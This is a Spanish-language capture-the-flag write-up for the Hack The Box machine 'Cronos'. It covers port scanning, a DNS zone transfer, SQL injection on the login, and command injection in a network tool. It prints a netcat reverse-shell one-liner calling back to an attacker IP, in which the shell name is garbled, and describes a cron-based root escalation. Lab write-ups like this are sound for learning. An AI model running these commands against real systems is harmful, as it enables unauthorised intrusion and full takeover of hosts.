### Enumeración y escaneo
Empezaremos haciendo un escaneo de puertos y veremos http, un dominio dns y el ssh
```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.23.8

22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Usaremos nslookup para saber hacía que dominio apunta la dirección IP
```bash
nslookup host [server]
nslookup 10.129.23.8 10.129.23.8
8.23.129.10.in-addr.arpa        name = ns1.cronos.htb.
```

Añadir el nuevo subdominio al fichero hosts
```
nano /etc/hosts
cronos.htb
```

Hacemos fuerza bruta para buscar posibles vulnerabilidades y lo que encontramos no nos sirve
```bash
gobuster dir --url http://cronos.htb/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt

.hta                 (Status: 403) [Size: 289]
.htaccess            (Status: 403) [Size: 294]
.htpasswd            (Status: 403) [Size: 294]
css                  (Status: 301) [Size: 306] [--> http://cronos.htb/css/]
favicon.ico          (Status: 200) [Size: 0]
index.php            (Status: 200) [Size: 2319]
js                   (Status: 301) [Size: 305] [--> http://cronos.htb/js/]
robots.txt           (Status: 200) [Size: 24]
server-status        (Status: 403) [Size: 298]
web.config           (Status: 200) [Size: 914]
```

Con lo que usaremos dig para hacer una transferencia de zona DNS, así descubriremos que tiene un subdominio que es admin.cronos.htb
```bash
dig axfr @cronos.htb cronos.htb / dig axfr @10.129.23.8 cronos.htb
; <<>> DiG 9.20.22-1-Debian <<>> axfr @10.129.23.8 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 79 msec
;; SERVER: 10.129.23.8#53(10.129.23.8) (TCP)
;; WHEN: Wed Apr 22 15:15:37 CEST 2026
;; XFR size: 7 records (messages 1, bytes 203)

```

Lo añadiremos al fichero hosts
```bash
nano /etc/hosts
10.129.23.8     cronos.htb admin.cronos.htb
```
 

### Primera vulnerabilidad--SQLi

En la página encontramos que el login es vulnerable a SQLi

![Login.png](/img/Login.png)
Después de ese login entraremos a una herramienta web para la red con opción de traceroute y ping

![Net_tool.png](/img/Net_tool.png)

### Segunda vulnerabilidad--RCE
Descubrí que tiene una vulnerabilidad y se le puede inyectar código usando el ; ya que cumple como si fuese una terminal
![Vulnerabilidad1.png](/img/Vulnerabilidad1.png)

Aprovecharemos esto usando burpsuite para cambiar el comando y abrir una shell en nuestro equipo.

![Burpsuite1.png](/img/Burpsuite1.png)

Usamos el siguiente comando que nos permitirá hacer una escucha para obtener la reverse shell, recordad encodear los símbolos en URL para que funcione.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
```

![Burpsuite2.png](/img/Burpsuite2.png)

En mi caso he usado penelope para obtener la shell full interactiva, ya tenemos acceso y podremos acceder a la primera flag user.txt

![Rev_Shell1.png](/img/Rev_Shell1.png)


![UserTXT.png](/img/UserTXT.png)

Me crearé un servidor web para descargar en la máquina victima linpeas y proceder a enumerar.
En la enumeración vemos algo muy interesante en los cronjobs y es que el fichero /var/www/laravel/artisan en el cual tenemos todos los permisos

![EscaladaPrivs.png](/img/EscaladaPrivs.png) 
```bash
www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan         
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

### Escalada de privilegios
Para la escalada de privilegios cambiaremos el fichero php por una reverse shell que nos ejecutará el cron como root y tendremos acceso privilegiado al sistema.

![EscaladaPrivs1.png](/img/EscaladaPrivs1.png)

Ahora debemos poner en escucha a través del puerto que hemos puesto en la reverse shell y esperaremos, después de unos segundos seremos root y habremos completado la máquina con la úl

![RootTXT.png](/img/RootTXT.png)
